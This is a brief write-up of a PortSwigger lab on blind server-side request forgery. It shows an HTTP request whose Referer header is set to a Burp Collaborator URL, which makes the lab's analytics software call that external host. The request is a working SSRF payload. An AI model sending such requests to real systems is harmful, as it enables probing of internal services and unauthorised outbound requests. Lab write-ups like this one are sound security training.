# Blind SSRF with out-of-band detection — (PortSwigger — Practitioner)
**Date:** 2026-08-22
 
---
 
## Vulnerability / core concept
Blind SSRF

---


## Payload / key command
As we are given, this web application uses analytics software when user visits some product. This software uses `Referer` header and sends request to it. To exploit this software, all we can do is to replace the value of the `Referer` header to our Burp Collaborator and send request:
```bash
GET /product?productId=15 HTTP/2
Host: 0a0900950351c5b381b7a7f200e9006d.web-security-academy.net
Cookie: session=MbcAz9mKEoqS9OTWYGKkyaKhX8bRDxHY
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://g4lqx6fptgywpmg91pcywzew5nbez4nt.oastify.com/
```
This will send request to our Collaborator and will solve this lab.


